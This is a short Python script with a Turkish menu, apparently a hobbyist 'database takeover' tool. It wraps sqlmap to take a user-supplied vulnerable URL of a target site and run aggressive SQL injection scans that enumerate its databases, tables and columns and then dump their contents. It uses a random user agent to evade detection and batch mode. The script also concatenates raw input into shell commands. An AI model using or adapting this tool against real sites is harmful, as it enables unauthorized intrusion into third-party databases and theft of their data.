#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet VERI TABANI ELE GECIRME")

print("""

---------------------------------------------------------------------------------------------------------
----------------------Veri Tabanı Ele Geçirme Programına Hoşgeldiniz.------------------------------------
---------------------------------------------------------------------------------------------------------
-----------------------1) Sadece Açıklı Linki Biliyorum--------------------------------------------------
-----------------------2) Açıklı Linki, Veritabanı Adını Biliyorum.--------------------------------------
-----------------------3) Açıklı Linki, Veritabanı Adını, Tablo Adını Biliyorum.-------------------------
-----------------------4) Açıklı Linki, Veritabanı Adını, Tablo Adını, Kolon Adını Biliyorum.------------
---------------------------------------------------------------------------------------------------------
-----------------------Örnek Açıklı Link: http://www.example.com/article.php?id=25-----------------------
---------------------------------------------------------------------------------------------------------
-----------------------------------------Ferhat Sara-----------------------------------------------------
---------------------------------------------------------------------------------------------------------
---------------------------------------------------------------------------------------------------------


""")

number=raw_input("İşlem Numarası Girin:  ")

if(number=="1"):
	targetsite=raw_input("Hedef Site Girin:  ")
	os.system("sqlmap -u "+targetsite+" --dbs --random-agent --risk=3 --level=5 --answers= y -v3 --batch --threads=10")

if(number=="2"):
	targetsite=raw_input("Hedef Site Girin:  ")
	dbname=raw_input("Veritabanı Adı Girin:  ")
	os.system("sqlmap -u "+targetsite+" -D "+dbname+" --tables --random-agent --risk=3 --level=5 --answers= y -v3 --batch --threads=10")
if(number=="3"):
	targetsite=raw_input("Hedef Site Girin:  ")
	dbname=raw_input("Veritabanı Adı Girin:  ")
	table=raw_input("Tablo Adı Girin: ")
	os.system("sqlmap -u "+targetsite+" -D "+dbname+" -T "+table+" --columns --random-agent --risk=3 --level=5 --answers= y -v3 --batch --threads=10")
if(number=="4"):
	targetsite=raw_input("Hedef Site Girin:  ")
	dbname=raw_input("Veritabanı Adı Girin:  ")
	table=raw_input("Tablo Adı Girin: ")
	column=raw_input("Kolon Adı Girin:  ")
	os.system("sqlmap -u "+targetsite+" -D "+dbname+" -T "+table+" -C "+column+" --dump --random-agent --risk=3 --level=5 --answers= y -v3 --batch --threads=10")
	

